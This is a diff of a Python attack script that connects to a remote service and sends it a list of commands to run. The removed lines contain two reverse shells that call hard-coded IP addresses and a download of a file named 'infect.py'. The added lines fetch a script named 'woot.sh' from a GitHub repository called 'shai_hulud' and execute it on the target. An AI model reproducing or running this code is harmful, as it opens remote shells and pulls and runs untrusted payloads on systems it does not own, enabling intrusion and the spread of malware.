@@ -10,13 +10,12 @@ import sys
 import base64
 import time
 
-
-ADDR = sys.argv[1]
-PORT = int(sys.argv[2])
-CMD = ['apt-get update -y', 'apt-get install wget -y', 'apt-get install sudo', 'bash -i >& /dev/tcp/192.168.1.2/4444 0>&1', '0<&196;exec 196<>/dev/tcp/10.10.10.10/9001; sh <&196 >&196 2>&196', 'wget -O infect.py -P /tmp https://raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/infect.py -y', 'touch /tmp/x']
+ADDR = '0.0.0.0'
+PORT = 8825
+CMD = ['wget -O /tmp/woot.sh raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/woot.sh', 'bash /tmp/woot.sh']
 
 for cmdnum in range(len(CMD)):
-    print("Attempting "  + CMD[cmdnum] + ", " + str(cmdnum) + "/ " + str(len(CMD)))
+    print("Attempting "  + CMD[cmdnum] + ", " + str(cmdnum + 1) + "/ " + str(len(CMD)))
     s = socket(AF_INET, SOCK_STREAM)
     s.connect((ADDR, PORT))
     res = s.recv(1024)
@@ -55,4 +54,5 @@ for cmdnum in range(len(CMD)):
     s.recv(1024)
     print('[*] Done')
     time.sleep(3)
+
 
